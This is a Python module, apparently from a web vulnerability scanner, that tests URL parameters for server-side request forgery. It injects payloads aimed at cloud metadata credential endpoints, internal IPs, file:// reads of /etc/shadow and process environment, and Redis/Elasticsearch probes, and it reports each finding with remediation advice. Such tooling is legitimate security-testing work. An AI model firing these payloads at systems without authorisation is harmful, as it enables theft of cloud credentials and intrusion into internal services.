"""
SSRF Testing Module
Techniques: Internal IP probing, cloud metadata endpoints, DNS-based detection,
            blind SSRF via out-of-band, URL scheme abuse
"""

import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .utils import HTTPClient

SSRF_PAYLOADS = [
    # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # GCP metadata
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure metadata
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # DigitalOcean metadata
    "http://169.254.169.254/metadata/v1/",
    # Localhost
    "http://localhost",
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://[::1]",
    "http://127.1",
    "http://2130706433",   # 127.0.0.1 decimal
    # Internal ranges
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    # URL scheme abuse
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "dict://127.0.0.1:6379/info",  # Redis
    "gopher://127.0.0.1:9200/_",   # Elasticsearch
    # Bypass encodings
    "http://①②⑦.⓪.⓪.①",
    "http://0177.0.0.1",    # octal
    "http://0x7f000001",    # hex
]

AWS_INDICATORS = [
    "ami-id", "instance-id", "hostname", "mac", "security-credentials",
    "iam", "aws", "amazon", "metadata"
]

LOCALHOST_INDICATORS = [
    "root:x:", "/bin/bash", "localhost", "127.0.0.1", "::1",
    "redis_version", "elasticsearch", "docker", "internal"
]

URL_PARAMS = [
    'url', 'uri', 'path', 'src', 'source', 'dest', 'destination',
    'redirect', 'next', 'return', 'returnUrl', 'returnTo', 'callback',
    'link', 'proxy', 'target', 'file', 'fetch', 'load', 'page',
    'ref', 'request', 'goto', 'img', 'image', 'show', 'open',
    'data', 'endpoint', 'api', 'feed', 'host', 'domain',
]


class SSRFTester:
    def __init__(self, config):
        self.http    = HTTPClient(config)
        self.threads = config.get('threads', 15)
        self.results = []

    def run(self, target, urls):
        print(f"    [~] Testing SSRF on {len(urls)} URLs...")
        endpoints = self._extract_url_params(urls, target)
        print(f"    [~] {len(endpoints)} URL-like parameters found")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(self._test, ep) for ep in endpoints]
            for f in concurrent.futures.as_completed(futures):
                res = f.result()
                if res:
                    self.results.extend(res)
        return self.results

    def _extract_url_params(self, urls, target):
        endpoints = []
        base = f"https://{target}" if not target.startswith('http') else target
        for url in urls:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for param, vals in qs.items():
                if param.lower() in URL_PARAMS:
                    endpoints.append((url, param, vals[0] if vals else ''))
        if not endpoints:
            for p in URL_PARAMS[:5]:
                endpoints.append((f"{base}?{p}=http://example.com", p, 'http://example.com'))
        return endpoints

    def _test(self, endpoint):
        url, param, orig = endpoint
        findings = []
        for payload in SSRF_PAYLOADS:
            injected = self._inject(url, param, payload)
            resp = self.http.get(injected)
            if not resp:
                continue
            body = resp.text.lower()

            # Check AWS metadata indicators
            if any(ind in body for ind in AWS_INDICATORS):
                print(f"    [VULN] SSRF (AWS Metadata) @ {url} param={param}")
                findings.append(self._finding(url, param, payload, 'AWS Cloud Metadata exposure', 'Critical'))
                break

            # Check localhost indicators
            if any(ind in body for ind in LOCALHOST_INDICATORS):
                print(f"    [VULN] SSRF (Internal resource) @ {url} param={param}")
                findings.append(self._finding(url, param, payload, 'Internal resource accessible', 'High'))
                break

            # Significant response on file:// scheme
            if payload.startswith('file://') and len(resp.text) > 50:
                print(f"    [VULN] SSRF (File read) @ {url} param={param}")
                findings.append(self._finding(url, param, payload, 'Local file read via file:// scheme', 'Critical'))
                break

        return findings

    def _finding(self, url, param, payload, evidence, severity):
        return {
            'type':        'Server-Side Request Forgery (SSRF)',
            'technique':   'SSRF',
            'url':         url,
            'parameter':   param,
            'payload':     payload,
            'evidence':    evidence,
            'severity':    severity,
            'remediation': 'Validate and whitelist allowed URLs. Block internal IP ranges. Disable unnecessary URL schemes.',
            'cvss':        '9.8' if severity == 'Critical' else '7.5',
            'cwe':         'CWE-918',
        }

    def _inject(self, url, param, value):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
